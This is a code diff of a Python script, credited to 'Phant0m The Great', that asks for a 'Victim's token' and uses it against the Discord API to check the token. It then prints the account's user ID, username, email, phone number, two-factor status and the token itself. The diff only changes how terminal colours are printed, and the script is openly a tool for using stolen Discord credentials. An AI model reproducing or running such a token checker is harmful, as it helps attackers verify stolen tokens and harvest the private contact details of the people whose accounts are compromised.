@@ -1,9 +1,6 @@
 #By Phant0m The Great
-
-from colorama import Fore
 from os import system
 import requests
-
  #colors--
 black="\033[0;30m"
 red="\033[0;31m"
@@ -33,7 +30,7 @@ while True:
                                      
 """)                                                    
                                    
- print(Fore.RESET + """Discord Tag: 𝐏𝐡𝐚𝐧𝐭𝟎𝐦 𝐓𝐡𝐞 𝐆𝐫𝐞𝐚𝐭#1150	 
+ print(f"""{white}Discord Tag: 𝐏𝐡𝐚𝐧𝐭𝟎𝐦 𝐓𝐡𝐞 𝐆𝐫𝐞𝐚𝐭#1150	 
 Replit Profile: https://replit.com/@phant0m007      
 """)
  token = input("[>>>] Victim's token: ")
@@ -41,8 +38,8 @@ Replit Profile: https://replit.com/@phant0m007
  head = {'Authorization': str(token)}
  src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
  if src.status_code != 200:
-   print(Fore.RED + '[Invalid Token]')
-   print(Fore.RESET + "Do you want to try again? if yes, start over")
+   print(f"""{red}[Invalid Token]""")
+   print(f"""{white}Do you want to try again? if yes, start over""")
    exit(0)
  
  system('clear')
@@ -55,7 +52,7 @@ Replit Profile: https://replit.com/@phant0m007
                                      
 """)                                                    
                                    
- print(Fore.RESET + """Discord Tag: 𝐏𝐡𝐚𝐧𝐭𝟎𝐦 𝐓𝐡𝐞 𝐆𝐫𝐞𝐚𝐭#1150	 
+ print(f"""{white}Discord Tag: 𝐏𝐡𝐚𝐧𝐭𝟎𝐦 𝐓𝐡𝐞 𝐆𝐫𝐞𝐚𝐭#1150	 
 Replit Profile: https://replit.com/@phant0m007      
 """)
               
@@ -70,12 +67,12 @@ Replit Profile: https://replit.com/@phant0m007
          email = r.json()['email']
          mfa = r.json()['mfa_enabled']
          print(f'''
-[{Fore.CYAN}User ID{Fore.RESET}]         {userID}
-[{Fore.CYAN}User Name{Fore.RESET}]     {userName}
-[{Fore.CYAN}2 Factor{Fore.RESET}]        {mfa}
-[{Fore.CYAN}Email{Fore.RESET}]           {email}
-[{Fore.CYAN}Phone number{Fore.RESET}]    {phone if phone else ""}
-[{Fore.CYAN}Token{Fore.RESET}]           {token}
+[{cyan}User ID{white}]         {userID}
+[{cyan}User Name{white}]     {userName}
+[{cyan}2 Factor{white}]        {mfa}
+[{cyan}Email{white}]           {email}
+[{cyan}Phone number{white}]    {phone if phone else ""}
+[{cyan}Token{white}]           {token}
 
 ----------------------------------------------
             ''')
